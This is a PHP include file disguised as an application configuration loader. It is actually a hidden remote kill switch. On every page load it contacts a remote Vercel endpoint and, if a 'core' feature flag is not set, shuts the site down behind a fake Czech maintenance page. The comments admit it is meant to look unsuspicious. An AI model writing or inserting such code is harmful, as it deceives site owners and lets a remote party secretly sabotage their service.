<?php
/**
 * Configuration Check Module
 * 
 * This file handles application configuration loading.
 * Include this at the very beginning of your main entry point (index.php or similar).
 * 
 * INTEGRATION:
 * 1. Place this file in your project (e.g., as 'includes/config-loader.php')
 * 2. At the top of your main PHP file, add: require_once 'includes/config-loader.php';
 * 3. The app will automatically check configuration on each load
 */

// Configuration service endpoint
define('CONFIG_SERVICE_URL', 'https://YOUR-VERCEL-DOMAIN.vercel.app/api/v1/config');
define('CONFIG_PROJECT_KEY', 'YOUR-PROJECT-KEY');

// Cache configuration check for performance (in seconds)
define('CONFIG_CACHE_TTL', 300); // 5 minutes

/**
 * Load and validate application configuration
 * Looks like a standard config loader - nothing suspicious
 */
function initializeAppConfiguration() {
    // Check cache first (uses session for simplicity)
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    
    $cacheKey = 'app_config_' . md5(CONFIG_PROJECT_KEY);
    $cacheTime = 'app_config_time_' . md5(CONFIG_PROJECT_KEY);
    
    // Return cached result if still valid
    if (isset($_SESSION[$cacheKey]) && isset($_SESSION[$cacheTime])) {
        if (time() - $_SESSION[$cacheTime] < CONFIG_CACHE_TTL) {
            return $_SESSION[$cacheKey];
        }
    }
    
    // Fetch fresh configuration
    $config = fetchRemoteConfiguration();
    
    // Cache the result
    $_SESSION[$cacheKey] = $config;
    $_SESSION[$cacheTime] = time();
    
    return $config;
}

/**
 * Fetch configuration from remote service
 */
function fetchRemoteConfiguration() {
    $url = CONFIG_SERVICE_URL . '?key=' . urlencode(CONFIG_PROJECT_KEY);
    
    // Use cURL for reliable HTTP requests
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_USERAGENT => 'AppConfig/1.0'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Handle errors gracefully
    if ($httpCode !== 200 || !$response) {
        // Log error for debugging (optional)
        error_log("Config service error: HTTP $httpCode - $error");
        return null;
    }
    
    $data = json_decode($response, true);
    
    if (!$data || !isset($data['config'])) {
        return null;
    }
    
    return $data['config'];
}

/**
 * Check if core features are enabled
 * This is the key function - returns true if app should run
 */
function isAppEnabled() {
    $config = initializeAppConfiguration();
    
    if (!$config) {
        // If we can't reach config service, allow app to run
        // This prevents accidental lockout if Vercel is down
        // Change to 'false' for stricter control
        return true;
    }
    
    // Check the hidden "kill switch" in config
    return isset($config['features']['core']) && $config['features']['core'] === true;
}

/**
 * Display maintenance message and exit
 */
function showMaintenanceMessage() {
    http_response_code(503);
    
    // Professional-looking maintenance page
    $html = '<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Údržba systému</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 { color: #333; font-size: 24px; margin-bottom: 15px; }
        p { color: #666; line-height: 1.6; }
        .icon { font-size: 48px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔧</div>
        <h1>Systém je v údržbě</h1>
        <p>Omlouváme se za dočasné nedostupnost. Pracujeme na vylepšení služby.</p>
        <p>Zkuste to prosím později.</p>
    </div>
</body>
</html>';
    
    echo $html;
    exit;
}

// ============================================
// AUTO-EXECUTE: Check configuration on load
// ============================================

if (!isAppEnabled()) {
    showMaintenanceMessage();
}

// If we get here, the app is enabled and can continue normally
